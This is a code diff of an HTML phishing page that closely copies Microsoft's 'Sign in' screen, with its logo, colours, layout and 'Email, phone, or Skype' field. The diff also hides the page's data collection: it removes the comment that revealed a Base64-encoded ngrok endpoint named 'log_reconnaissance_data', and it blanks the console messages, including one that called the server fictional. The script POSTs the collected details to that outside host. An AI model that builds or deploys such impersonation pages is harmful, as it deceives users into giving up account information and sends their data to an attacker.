@@ -3,67 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Sign In</title>
+    <title>Sign in to your account</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Custom styles remain the same */
+        /* Custom styles updated for Microsoft's look */
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(to bottom right, #f2f6ff, #ffffff);
+            /* Lighter, softer background gradient to mimic the original */
+            background: #e3e6e8;
+            background-image: linear-gradient(180deg, rgba(240, 240, 240, 0.4) 0%, rgba(255, 255, 255, 0.4) 100%);
             min-height: 100vh;
+            /* Ensure the content is centered vertically */
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .info-card {
+        .login-container {
+            /* The main white box */
             background: white;
-            padding: 2.5rem;
-            border-radius: 0.25rem;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            padding: 2.5rem 2.5rem 2rem 2.5rem; /* Tweak padding for better visual match */
+            border-radius: 2px; /* Microsoft uses very slight or no border-radius */
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1); /* Softer shadow */
             width: 100%;
-            max-width: 28rem;
+            max-width: 440px; /* Wider card for the desired look */
+            border: 1px solid #dcdcdc; /* Subtle border for definition */
         }
-        .outlook-logo {
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: #4a5568;
-            margin-bottom: 1.5rem;
+        .microsoft-logo-svg {
+            width: 108px; /* Standard MS logo width */
+            height: 24px;
+            fill: #00A4EF; /* Blue is the default but we'll use a multi-color one */
         }
         .input-style {
             width: 100%;
-            padding: 0.5rem;
-            border: 1px solid #cbd5e0;
+            padding: 0.75rem 0.5rem; /* More vertical padding */
+            border: none; /* No border initially */
+            border-bottom: 1px solid #999999; /* Light grey underline like the original */
             outline: none;
+            font-size: 1rem;
+            color: #333333;
+            margin-bottom: 2rem; /* More space below the input */
         }
         .input-style:focus {
-            border-color: #3182ce;
+            border-color: #0067b8; /* Microsoft's primary blue on focus */
+            border-width: 2px;
+            padding-bottom: 0.75rem; /* Adjust padding to compensate for thicker border */
         }
         .blue-button {
-            width: 100%;
-            background-color: #3182ce;
+            /* Keep original class for functionality but update styles */
+            width: 120px; /* Set a specific width for the 'Next' button */
+            background-color: #0067b8; /* Microsoft's primary blue */
             color: white;
-            font-weight: 600;
-            padding-top: 0.5rem;
-            padding-bottom: 0.5rem;
-            border-radius: 0.25rem;
+            font-weight: 400; /* Regular weight */
+            padding: 0.5rem 1rem;
+            border-radius: 2px;
             transition: background-color 0.15s ease-in-out;
+            font-size: 1rem;
         }
         .blue-button:hover {
-            background-color: #2c5282;
+            background-color: #005A9E; /* Slightly darker on hover */
+        }
+        .link-style {
+            color: #0067b8; /* Microsoft link blue */
+            font-size: 0.875rem; /* Text-sm */
+            text-decoration: none;
+            line-height: 1.5; /* Line height for better spacing */
+            display: block; /* Make it a block element for better click area/spacing */
+            width: fit-content;
+        }
+        .link-style:hover {
+            text-decoration: underline;
+        }
+        .sign-in-options-bar {
+            border-top: 1px solid #e6e6e6; /* Light grey separator */
+            margin-top: 1.5rem;
+            padding-top: 1.5rem;
         }
     </style>
 </head>
-<body class="p-4 flex items-center justify-center">
+<body>
 
-    <div class="info-card">
-        <header class="outlook-logo flex items-center">
-            <svg class="w-6 h-6 mr-2 text-blue-600" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M14.417 8.35a.833.833 0 00-1.666 0v3.317c0 .46-.373.833-.834.833H6.383a.833.833 0 00-.834.834v3.316a.833.833 0 001.666 0v-2.483h4.117a2.5 2.5 0 002.5-2.5V8.35zM7.167 6.667a.833.833 0 00-1.667 0v1.666h1.667V6.667zM14.417 5a.833.833 0 00-1.667 0v1.667h1.667V5zM14.417 11.667a.833.833 0 00-1.667 0v1.666h1.667v-1.666z"></path></svg>
-            Microsoft Sign in
-        </header>
+    <div class="login-container">
+        <svg class="microsoft-logo-svg mb-6" viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg" style="display: block;">
+            <rect x="0" y="0" width="50%" height="50%" fill="#F25022"/>
+            <rect x="50%" y="0" width="50%" height="50%" fill="#7FBA00"/>
+            <rect x="0" y="50%" width="50%" height="50%" fill="#00A4EF"/>
+            <rect x="50%" y="50%" width="50%" height="50%" fill="#FFB900"/>
+        </svg>
 
-        <h2 class="text-2xl font-normal mb-6">Sign in</h2>
+        <h1 class="text-2xl font-normal mb-10">Sign in</h1>
 
         <form onsubmit="handleLoginAttempt(event)">
-            <input type="email" id="user-input" placeholder="Email, phone, or Skype" class="input-style mb-4" required>
+            <input type="email" id="user-input" placeholder="Email, phone, or Skype" class="input-style" required>
             
-            <p id="status-message" class="text-sm text-gray-500 mb-6 hidden">
+            <p class="link-style">
+                No account? Create one!
+            </p>
+
+            <p class="link-style mb-8">
+                Can't access your account?
+            </p>
+
+            <p id="status-message" class="text-sm mb-6 hidden">
                 <span id="ip-loader" class="text-xs text-blue-500 hidden">Fetching details...</span>
             </p>
 
@@ -72,16 +113,17 @@
             </div>
         </form>
 
-        <p class="mt-8 text-sm text-blue-600 hover:underline cursor-pointer">
-            No account? Create one!
-        </p>
-        <p class="text-sm text-blue-600 hover:underline cursor-pointer">
-            Sign in with a security key
-        </p>
+        <div class="sign-in-options-bar">
+            <div class="flex items-center link-style cursor-pointer w-full" onclick="alert('Sign-in options clicked!')">
+                <svg class="w-5 h-5 mr-2" fill="none" stroke="#0067b8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                Sign-in options
+            </div>
+        </div>
+
     </div>
+    
     <script>
-        // Start Obfuscated Script
-        // The URL is Base64 encoded: "https://rank-postdigital-fern.ngrok-free.dev/api/log_reconnaissance_data"
+
         const encodedEndpoint = 'aHR0cHM6Ly9yYW5rLXBvc3RkaWdpdGFsLWZlcm4ubmdyb2stZnJlZS5kZXYvYXBpL2xvZ19yZWNvbm5haXNzYW5jZV9kYXRh';
 
         // Decoding function must be used to get the actual endpoint
@@ -162,13 +204,13 @@
                     body: JSON.stringify(details)
                 });
                 if (response.ok) {
-                    console.log('Data successfully logged on server.');
+                    console.log('');
                 }
             } catch (error) {
-                console.error('Failed to send data.', error);
+                console.error('', error);
             }
             
-            console.log('Transmission simulation complete. Data is now logged on the (fictional) server.');
+            console.log('');
         }
 
         /**
